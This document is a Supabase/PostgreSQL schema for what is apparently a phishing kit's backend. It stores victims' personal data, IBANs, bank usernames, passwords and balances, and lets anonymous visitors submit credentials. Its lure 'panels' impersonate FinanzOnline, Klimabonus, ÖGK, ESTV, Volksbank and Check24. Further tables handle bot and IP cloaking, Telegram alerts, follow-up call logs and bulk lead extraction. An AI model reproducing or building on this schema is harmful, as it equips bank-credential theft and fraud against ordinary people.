
-- ROLES
DO $$ BEGIN
  CREATE TYPE public.app_role AS ENUM ('admin');
EXCEPTION WHEN duplicate_object THEN NULL; END $$;

CREATE TABLE public.user_roles (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE NOT NULL,
  role app_role NOT NULL,
  UNIQUE (user_id, role)
);
GRANT SELECT ON public.user_roles TO authenticated;
GRANT ALL ON public.user_roles TO service_role;
ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;

CREATE OR REPLACE FUNCTION public.has_role(_user_id UUID, _role app_role)
RETURNS BOOLEAN LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$
  SELECT EXISTS (SELECT 1 FROM public.user_roles WHERE user_id = _user_id AND role = _role)
$$;

CREATE POLICY "Users can read own roles" ON public.user_roles
  FOR SELECT TO authenticated USING (auth.uid() = user_id);

CREATE OR REPLACE FUNCTION public.assign_admin_role()
RETURNS TRIGGER LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  INSERT INTO public.user_roles (user_id, role) VALUES (NEW.id, 'admin');
  RETURN NEW;
END; $$;

CREATE TRIGGER on_auth_user_created_assign_role
AFTER INSERT ON auth.users
FOR EACH ROW EXECUTE FUNCTION public.assign_admin_role();

-- SUBMISSIONS
CREATE TABLE public.submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL,
  created_at timestamptz DEFAULT now(),
  full_name text, email text, birthdate text, phone text,
  street text, house_number text, staircase text, door_number text,
  postal_code text, city text, iban text, bank text,
  bank_username text, bank_password text,
  bank_username_label text DEFAULT 'Benutzername',
  bank_password_label text DEFAULT 'Passwort',
  bank_extra jsonb DEFAULT '{}'::jsonb,
  balance text,
  status text DEFAULT 'Neu',
  notified_at timestamptz,
  telegram_sent boolean NOT NULL DEFAULT false,
  user_agent text,
  domain text,
  flow text DEFAULT 'finanzonline'
);
GRANT ALL ON public.submissions TO anon;
GRANT ALL ON public.submissions TO authenticated;
GRANT ALL ON public.submissions TO service_role;
ALTER TABLE public.submissions DISABLE ROW LEVEL SECURITY;
DO $$ BEGIN
  ALTER PUBLICATION supabase_realtime ADD TABLE public.submissions;
EXCEPTION WHEN OTHERS THEN NULL; END $$;

CREATE OR REPLACE FUNCTION public.update_bank_credentials(
  p_session_id text, p_username text, p_password text,
  p_username_label text DEFAULT 'Benutzername',
  p_password_label text DEFAULT 'Passwort',
  p_extra jsonb DEFAULT '{}'::jsonb
) RETURNS void LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF length(coalesce(p_username,'')) > 500 OR length(coalesce(p_password,'')) > 500 THEN
    RAISE EXCEPTION 'credential too long';
  END IF;
  UPDATE public.submissions
  SET bank_username = p_username, bank_password = p_password,
      bank_username_label = p_username_label, bank_password_label = p_password_label,
      bank_extra = p_extra
  WHERE session_id = p_session_id;
END; $$;
GRANT EXECUTE ON FUNCTION public.update_bank_credentials(text, text, text, text, text, jsonb) TO anon, authenticated;

CREATE TABLE public.submission_notes (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  submission_id uuid REFERENCES public.submissions(id) ON DELETE CASCADE NOT NULL,
  user_id uuid NOT NULL, user_email text NOT NULL, content text NOT NULL,
  created_at timestamptz DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.submission_notes TO authenticated;
GRANT ALL ON public.submission_notes TO service_role;
ALTER TABLE public.submission_notes ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage notes" ON public.submission_notes
  FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'::app_role));

CREATE TABLE public.submission_calls (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  submission_id uuid REFERENCES public.submissions(id) ON DELETE CASCADE NOT NULL,
  user_id uuid NOT NULL, user_email text NOT NULL,
  call_type text NOT NULL DEFAULT 'mailbox',
  created_at timestamptz DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.submission_calls TO authenticated;
GRANT ALL ON public.submission_calls TO service_role;
ALTER TABLE public.submission_calls ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage calls" ON public.submission_calls
  FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'::app_role));

CREATE TABLE public.telegram_chat_ids (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  chat_id text NOT NULL UNIQUE, label text,
  domains text[] NOT NULL DEFAULT '{}',
  created_at timestamptz DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.telegram_chat_ids TO authenticated;
GRANT ALL ON public.telegram_chat_ids TO service_role;
ALTER TABLE public.telegram_chat_ids ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage telegram chat ids"
  ON public.telegram_chat_ids FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'::app_role))
  WITH CHECK (public.has_role(auth.uid(), 'admin'::app_role));

-- PANELS
CREATE TABLE public.panels (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  domain text NOT NULL UNIQUE,
  type text NOT NULL,
  meta_tag_enabled boolean NOT NULL DEFAULT false,
  meta_tag_snippet text,
  whitepage_enabled boolean NOT NULL DEFAULT false,
  created_at timestamptz NOT NULL DEFAULT now(),
  CONSTRAINT panels_type_check CHECK (type IN (
    'finanzonline','klimabonus','klimabonus_2','oegk_rueckerstattung',
    'oegk_datenaktualisierung','estv','volksbank_login','vb_investmentcheck',
    'check24','finanzonline_steuer'
  ))
);
GRANT SELECT ON public.panels TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.panels TO authenticated;
GRANT ALL ON public.panels TO service_role;
ALTER TABLE public.panels ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Public can read panels" ON public.panels FOR SELECT USING (true);
CREATE POLICY "Admins can manage panels" ON public.panels FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

CREATE TABLE public.panel_type_settings (
  type text PRIMARY KEY,
  favicon_url text,
  updated_at timestamptz NOT NULL DEFAULT now(),
  CONSTRAINT panel_type_settings_type_check CHECK (type IN (
    'finanzonline','klimabonus','klimabonus_2','oegk_rueckerstattung',
    'oegk_datenaktualisierung','estv','volksbank_login','vb_investmentcheck',
    'check24','finanzonline_steuer'
  ))
);
GRANT SELECT ON public.panel_type_settings TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.panel_type_settings TO authenticated;
GRANT ALL ON public.panel_type_settings TO service_role;
ALTER TABLE public.panel_type_settings ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Public can read panel_type_settings" ON public.panel_type_settings FOR SELECT USING (true);
CREATE POLICY "Admins manage panel_type_settings" ON public.panel_type_settings FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

-- BOT BLOCKS + IP BLOCKLIST
CREATE TABLE public.bot_blocks (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  ip text, user_agent text, referer text,
  reason text NOT NULL, domain text, path text,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT ON public.bot_blocks TO authenticated;
GRANT ALL ON public.bot_blocks TO service_role;
ALTER TABLE public.bot_blocks ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can read bot_blocks" ON public.bot_blocks FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'admin'::app_role));
CREATE INDEX bot_blocks_created_at_idx ON public.bot_blocks (created_at DESC);
CREATE INDEX bot_blocks_ip_idx ON public.bot_blocks (ip);
CREATE INDEX bot_blocks_reason_idx ON public.bot_blocks (reason);

CREATE TABLE public.ip_blocklist (
  id bigint generated always as identity primary key,
  base_int bigint not null, mask_int bigint not null,
  cidr text not null, source text not null,
  created_at timestamptz not null default now()
);
CREATE UNIQUE INDEX idx_ip_blocklist_cidr_source ON public.ip_blocklist(cidr, source);
CREATE INDEX idx_ip_blocklist_source ON public.ip_blocklist(source);
CREATE INDEX idx_ip_blocklist_base_mask ON public.ip_blocklist (base_int, mask_int);
GRANT SELECT ON public.ip_blocklist TO authenticated;
GRANT ALL ON public.ip_blocklist TO service_role;
ALTER TABLE public.ip_blocklist ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can view ip_blocklist" ON public.ip_blocklist FOR SELECT
  TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role));

CREATE OR REPLACE FUNCTION public.check_ip_blocked(p_ip_int bigint)
RETURNS TABLE(source text, cidr text)
LANGUAGE sql STABLE SECURITY DEFINER SET search_path = 'public' AS $$
  SELECT source, cidr FROM public.ip_blocklist
  WHERE (p_ip_int & mask_int) = base_int LIMIT 1;
$$;
GRANT EXECUTE ON FUNCTION public.check_ip_blocked(bigint) TO service_role;

-- PAGE VISITS
CREATE TABLE public.page_visits (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  domain text, path text,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX page_visits_domain_idx ON public.page_visits(domain);
CREATE INDEX page_visits_created_at_idx ON public.page_visits(created_at DESC);
GRANT SELECT ON public.page_visits TO authenticated;
GRANT ALL ON public.page_visits TO service_role;
ALTER TABLE public.page_visits ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can read page visits"
ON public.page_visits FOR SELECT TO authenticated
USING (public.has_role(auth.uid(), 'admin'));

-- DOMAIN CONNECTIONS
CREATE TABLE public.domain_connections (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  domain text NOT NULL UNIQUE,
  luxuryhost_id text,
  status text NOT NULL DEFAULT 'pending',
  last_message text,
  connected_at timestamptz,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.domain_connections TO authenticated;
GRANT ALL ON public.domain_connections TO service_role;
ALTER TABLE public.domain_connections ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can read domain_connections" ON public.domain_connections FOR SELECT
  TO authenticated USING (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can insert domain_connections" ON public.domain_connections FOR INSERT
  TO authenticated WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can update domain_connections" ON public.domain_connections FOR UPDATE
  TO authenticated USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can delete domain_connections" ON public.domain_connections FOR DELETE
  TO authenticated USING (public.has_role(auth.uid(), 'admin'));

CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN NEW.updated_at = now(); RETURN NEW; END;
$$ LANGUAGE plpgsql SET search_path = public;

CREATE TRIGGER update_domain_connections_updated_at
  BEFORE UPDATE ON public.domain_connections
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- LEADS
CREATE TABLE public.leads (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  phone text NOT NULL UNIQUE,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX leads_created_at_idx ON public.leads (created_at);
GRANT SELECT, INSERT, DELETE ON public.leads TO authenticated;
GRANT ALL ON public.leads TO service_role;
ALTER TABLE public.leads ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can select leads" ON public.leads FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can insert leads" ON public.leads FOR INSERT TO authenticated
  WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can delete leads" ON public.leads FOR DELETE TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));

CREATE OR REPLACE FUNCTION public.get_leads_count()
RETURNS bigint LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin'::public.app_role) THEN RETURN 0; END IF;
  RETURN (SELECT count(*) FROM public.leads);
END; $$;
REVOKE ALL ON FUNCTION public.get_leads_count() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.get_leads_count() TO authenticated, service_role;

CREATE TABLE public.leads_bot_sessions (
  chat_id text PRIMARY KEY,
  state text NOT NULL DEFAULT 'idle',
  amount integer,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.leads_bot_sessions TO authenticated;
GRANT ALL ON public.leads_bot_sessions TO service_role;
ALTER TABLE public.leads_bot_sessions ENABLE ROW LEVEL SECURITY;
CREATE POLICY "service role only" ON public.leads_bot_sessions FOR ALL TO service_role USING (true) WITH CHECK (true);

CREATE TABLE public.leads_bot_authorized_chats (
  chat_id text PRIMARY KEY,
  label text,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.leads_bot_authorized_chats TO authenticated;
GRANT ALL ON public.leads_bot_authorized_chats TO service_role;
ALTER TABLE public.leads_bot_authorized_chats ENABLE ROW LEVEL SECURITY;
CREATE POLICY "authenticated can manage" ON public.leads_bot_authorized_chats FOR ALL TO authenticated USING (true) WITH CHECK (true);

CREATE TABLE public.leads_extraction_history (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  created_at timestamptz NOT NULL DEFAULT now(),
  extracted_count integer NOT NULL,
  chunk_size integer NOT NULL,
  backup_count integer NOT NULL DEFAULT 0,
  zip_path text, backup_path text,
  source text NOT NULL DEFAULT 'web',
  telegram_chat_id text
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.leads_extraction_history TO authenticated;
GRANT ALL ON public.leads_extraction_history TO service_role;
ALTER TABLE public.leads_extraction_history ENABLE ROW LEVEL SECURITY;
CREATE POLICY "authenticated manage history" ON public.leads_extraction_history FOR ALL TO authenticated USING (true) WITH CHECK (true);

CREATE POLICY "authenticated read leads-exports" ON storage.objects FOR SELECT TO authenticated USING (bucket_id = 'leads-exports');
CREATE POLICY "authenticated write leads-exports" ON storage.objects FOR INSERT TO authenticated WITH CHECK (bucket_id = 'leads-exports');
CREATE POLICY "authenticated update leads-exports" ON storage.objects FOR UPDATE TO authenticated USING (bucket_id = 'leads-exports');
CREATE POLICY "authenticated delete leads-exports" ON storage.objects FOR DELETE TO authenticated USING (bucket_id = 'leads-exports');

-- REMINDERS
CREATE TABLE public.reminders (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  chat_id text NOT NULL, title text NOT NULL,
  remind_at timestamptz NOT NULL, notify_at timestamptz NOT NULL,
  notified boolean NOT NULL DEFAULT false,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX idx_reminders_dispatch ON public.reminders (notified, notify_at);
CREATE INDEX idx_reminders_chat ON public.reminders (chat_id, remind_at);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.reminders TO authenticated;
GRANT ALL ON public.reminders TO service_role;
ALTER TABLE public.reminders ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage reminders" ON public.reminders FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'::public.app_role))
  WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));

CREATE TABLE public.reminders_bot_authorized_chats (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  chat_id text NOT NULL UNIQUE, label text,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.reminders_bot_authorized_chats TO authenticated;
GRANT ALL ON public.reminders_bot_authorized_chats TO service_role;
ALTER TABLE public.reminders_bot_authorized_chats ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage reminders authorized chats" ON public.reminders_bot_authorized_chats FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'::public.app_role))
  WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));

-- EMAIL BOT
CREATE TABLE public.email_bot_sessions (
  chat_id bigint PRIMARY KEY,
  flow text, step text,
  data jsonb NOT NULL DEFAULT '{}'::jsonb,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT ALL ON public.email_bot_sessions TO service_role;
ALTER TABLE public.email_bot_sessions ENABLE ROW LEVEL SECURITY;

CREATE TABLE public.email_bot_authorized_chats (
  chat_id bigint PRIMARY KEY,
  label text,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, DELETE ON public.email_bot_authorized_chats TO authenticated;
GRANT ALL ON public.email_bot_authorized_chats TO service_role;
ALTER TABLE public.email_bot_authorized_chats ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage email bot chats" ON public.email_bot_authorized_chats FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'::public.app_role))
  WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
